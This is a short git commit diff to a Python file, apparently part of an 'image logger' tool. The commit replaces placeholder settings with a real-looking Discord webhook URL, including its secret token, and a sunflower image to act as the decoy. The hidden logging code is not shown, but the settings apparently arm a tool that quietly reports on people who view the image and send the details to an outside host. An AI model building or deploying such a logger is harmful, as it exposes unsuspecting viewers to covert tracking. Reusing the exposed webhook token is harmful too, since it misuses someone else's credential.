8032743969a098946e3aee44b0dd68b488ba92d9
dhshcbdm-commits <dhshcbdm@gmail.com>
2026-09-19 09:52:50 +0100

    Update webhook and image URLs in configuration

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1550790665774825533/SNgqXkNskLurjZ8VvOyAhCILkZI1i5R3SkULtGTwd4hzGbDGdHNegSzYlVsvSwaTjJxR",
+    "image": "https://upload.wikimedia.org/wikipedia/commons/4/41/Sunflower_from_Silesia2.jpg?utm_source=commons.wikimedia.org&utm_campaign=index&utm_content=original", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
